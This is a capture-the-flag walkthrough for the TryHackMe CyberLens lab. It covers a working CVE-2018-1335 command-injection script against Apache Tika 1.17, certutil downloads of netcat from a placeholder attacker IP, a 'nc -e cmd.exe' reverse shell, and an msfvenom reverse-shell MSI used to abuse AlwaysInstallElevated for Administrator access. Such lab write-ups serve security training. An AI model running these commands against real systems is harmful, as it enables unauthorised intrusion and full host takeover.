---
tags:
  - THM
  - Windows
  - Easy
  - RCE
  - Metasploit
  - AlwaysInstallElevated
---
https://tryhackme.com/room/cyberlensp6/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.209.0 cyberlens.thm
```
# Scanning
```console
$ nmap -p 80,135,139,445,3389,5985,47001,49664,49665,49666,49667,49668,49669,49671,49676,61777 -sV -sC cyberlens.thm

PORT      STATE  SERVICE       VERSION
80/tcp    open   http          Apache httpd 2.4.57 ((Win64))
|_http-server-header: Apache/2.4.57 (Win64)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: CyberLens: Unveiling the Hidden Matrix
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 10.0.17763
|_  System_Time: 2025-04-28T00:35:35+00:00
| ssl-cert: Subject: commonName=CyberLens
| Not valid before: 2025-04-27T00:28:33
|_Not valid after:  2025-10-27T00:28:33
|_ssl-date: 2025-04-28T00:35:43+00:00; -2s from scanner time.
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
49671/tcp open   msrpc         Microsoft Windows RPC
49676/tcp open   msrpc         Microsoft Windows RPC
61777/tcp open   http          Jetty 8.y.z-SNAPSHOT
|_http-cors: HEAD GET
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: Jetty(8.y.z-SNAPSHOT)
|_http-title: Welcome to the Apache Tika 1.17 Server
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
# Enumeration
The website is a metadata image extractor working with [Apache Tika](https://tika.apache.org/) (on port 61777):
```console
$ whatweb http://cyberlens.thm:61777/

http://cyberlens.thm:61777/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Jetty(8.y.z-SNAPSHOT)], IP[10.10.209.0], Jetty[8.y.z-SNAPSHOT], Title[Welcome to the Apache Tika 1.17 Server]
```
The service `Apache Tika 1.17 Server` is vulnerable to [CVE-2018-1335 (RCE)](https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/).
# Exploitation
Create a `RCE.sh` script to inject commands:
```bash
#!/bin/bash

curl -s -X PUT http://cyberlens.thm:61777/meta \
	-H 'X-Tika-OCRTesseractPath: "cscript"' \
	-H 'X-Tika-OCRLanguage: //E:Jscript' \
	-H 'Expect: 100-continue' \
	-H 'Content-Type: image/jp2' \
	-H 'Connection: close' \
	--data-binary "var oShell = WScript.CreateObject('WScript.Shell'); var oExec = oShell.Exec('cmd /c $1');"
```
Create a Python server with **Netcat**:
```console
$ curl -s -O https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip

$ unzip -d netcat netcat-win32-1.12.zip

$ cd netcat

$ python3 -m http.server 8000
```
Wait for connections:
```bash
rlwrap nc -lvnp <PORT>
```
Get reverse shell connection using **Netcat**:
```console
$ ./RCE.sh 'certutil.exe -urlcache -split -f "http://<ATTACKER-IP>:8000/nc64.exe" C:\\Windows\\Temp\\nc64.exe'

$ ./RCE.sh 'C:\\Windows\\Temp\\nc64.exe -e cmd.exe <ATTACKER-IP> <PORT>'
```
Get the **user flag**:
```cmd
type C:/Users/CyberLens/Desktop/user.txt
```
# Post-Exploitation
[AlwaysInstallElevated](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated) is enabled, so every user can execute `.msi` files as **Administrator**:
```console
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```
Create Python server with malicious `rev.msi` file:
```console
$ msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f msi -o rev.msi

$ python -m http.server 8000
```
Wait for connections:
```bash
rlwrap nc -lvnp <PORT>
```
Download and execute the malicious `rev.msi` file:
```console
> certutil.exe -urlcache -split -f "http://<ATTACKER-IP>:8000/rev.msi" C:\Windows\Temp\rev.msi

> msiexec /quiet /qn /i C:\Windows\Temp\rev.msi
```
Get the **Administrator flag**:
```cmd
type C:\Users\Administrator\Desktop\admin.txt
```